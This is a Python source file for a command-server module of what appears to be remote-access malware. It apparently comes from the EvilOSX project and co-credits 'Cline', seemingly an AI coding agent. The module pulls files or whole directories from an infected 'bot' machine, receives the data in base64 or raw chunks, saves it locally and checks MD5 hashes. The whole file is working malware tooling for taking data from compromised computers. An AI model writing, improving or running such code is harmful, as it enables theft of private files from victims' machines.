# -*- coding: utf-8 -*-
__author__ = "Marten4n6", "Cline"
__license__ = "GPLv3"

import base64
from os import mkdir
from os import path

from server.modules.helper import *
from Cryptodome.Hash import MD5


class Module(ModuleABC):
    def get_info(self):
        return {
            "Author": ["Marten4n6", "Cline"],
            "Description": "Download a file or directory from the bot.",
            "References": [],
            "Stoppable": False
        }

    def get_setup_messages(self):
        return [
            "Path to file or directory on the bot's machine: ",
            "Buffer size (Leave empty for 4096 bytes): ",
            "Local output name (Leave empty to use the remote basename): "
        ]

    def setup(self, set_options):
        download_file = path.expanduser(set_options[0])
        buffer_size = set_options[1]
        output_name = set_options[2]

        if not download_file or not str(download_file).strip():
            self._view.display_error("Remote path cannot be empty.")
            return False, None

        if not buffer_size:
            buffer_size = 4096
        elif not str(buffer_size).isdigit() or int(buffer_size) <= 0:
            self._view.display_error("Invalid buffer size, must be a positive number.")
            return False, None
        else:
            buffer_size = int(buffer_size)

        if not output_name:
            # Default to the remote file's basename.
            output_name = path.basename(download_file)
        if not output_name:
            output_name = random_string(8)

        # Never allow path traversal, always write inside OUTPUT_DIRECTORY.
        safe_name = path.basename(output_name)
        output_file = path.join(OUTPUT_DIRECTORY, safe_name)
        if path.exists(output_file):
            self._view.display_error("A local file with that name already exists: {}".format(output_file))
            return False, None

        return True, {
            "buffer_size": buffer_size,
            "file_path": download_file,
            "response_options": {
                "output_name": safe_name
            }
        }

    def process_response(self, response, response_options):
        output_name = response_options["output_name"]
        output_file = path.join(OUTPUT_DIRECTORY, output_name)

        str_response = None
        if isinstance(response, bytes):
            str_response = response.decode("utf-8", errors="replace")
        else:
            str_response = str(response)

        if str_response and "Failed to download" in str_response:
            self._view.output(str_response, "attention")
        elif str_response and "Compressing directory" in str_response:
            self._view.output_separator()
            self._view.output(str_response, "info")
        elif str_response and "Stopped" in str_response:
            self._view.output_separator()
            self._view.output(str_response, "info")
        elif str_response and "Started" in str_response and "|" in str_response:
            try:
                md5_hash = str_response.split("|")[1].strip()
            except IndexError:
                md5_hash = "unknown"
            self._view.output_separator()
            self._view.output("Started downloading: \"{}\"...".format(output_name))
            self._view.output("Remote MD5 file hash: {}".format(md5_hash))
            self._view.output("Hint: run \"kill download\" to stop.", "info")
        elif str_response and "Finished" in str_response:
            self._view.output_separator()
            self._view.output("Local MD5 file hash: {}".format(self._get_file_hash(output_file)))
            self._view.output("Finished file download, saved to: {}".format(path.realpath(output_file)))
        else:
            # A binary chunk: decode it (base64-safe, with raw fallback) and append.
            raw = self._decode_piece(response)
            if not path.isdir(OUTPUT_DIRECTORY):
                mkdir(OUTPUT_DIRECTORY)
            with open(output_file, "ab") as output_fh:
                output_fh.write(raw)
            self._view.output("Received chunk ({} bytes)...".format(len(raw)), "info")

    @staticmethod
    def _decode_piece(piece):
        # Bots may send raw binary pieces OR base64 encoded text.
        # Try the base64 path first and fall back to the raw bytes.
        piece_bytes = piece
        if isinstance(piece, str):
            piece_bytes = piece.encode("utf-8", errors="replace")

        cleaned = b"".join(piece_bytes.splitlines())
        if len(cleaned) > 0 and len(cleaned) % 4 == 0:
            try:
                return base64.b64decode(cleaned, validate=True)
            except Exception:
                pass
        return piece_bytes

    @staticmethod
    def _get_file_hash(file_path):
        result = MD5.new()

        if not path.isfile(file_path):
            return result.hexdigest()

        with open(file_path, "rb") as input_file:
            while True:
                data = input_file.read(4096)
                if not data:
                    break
                result.update(data)
        return result.hexdigest()
